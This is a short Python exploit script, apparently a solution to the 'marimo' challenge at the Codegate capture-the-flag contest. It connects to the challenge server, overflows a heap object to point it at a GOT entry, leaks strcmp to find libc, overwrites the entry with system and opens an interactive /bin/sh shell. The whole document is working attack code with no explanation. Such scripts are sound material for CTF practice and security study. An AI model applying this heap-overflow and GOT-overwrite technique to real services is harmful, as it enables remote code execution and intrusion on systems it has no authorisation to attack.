import pwnbox, time , struct
pack = lambda x : struct.pack('<Q',x)
unpack = lambda x: struct.unpack('<Q',x)[0]
pack4 = lambda x : struct.pack('<I',x)
p = pwnbox.pipe.SocketPipe('ch41l3ng3s.codegate.kr', 3333)

def init(name, prof):
    for x in ['show me the marimo', name, prof]:
        p.read_until('>>')
        p.write(x+'\n')

def modify(idx, prof):
    for x in ['V', idx, 'M', prof, 'B']:
        t = p.read_until('>>')
        p.write(str(x)+'\n')

def view(idx) :
    for x in ['V', idx,'B']:
        ret = p.read_until('>>')
        p.write(str(x)+'\n')
    return ret

init('daramg','daramg')
init('daramg2','daramg2')
time.sleep(3)
obj =  pack4(int(time.time())) + pack4(3)
obj += pack(0x603040)*2
modify(0,'A'*0x30+obj)
data = view(1)
strcmp = unpack(data.split('name : ')[1].split('\nprofile')[0].ljust(8,'\x00'))
libc = strcmp - 0x089cd0
libc = strcmp - 0x9f570
system = libc + 0x45390
modify(1,pack(system).strip('\x00'))
p.read_until('>>')
p.write('/bin/sh\x00\n')
p.interact()
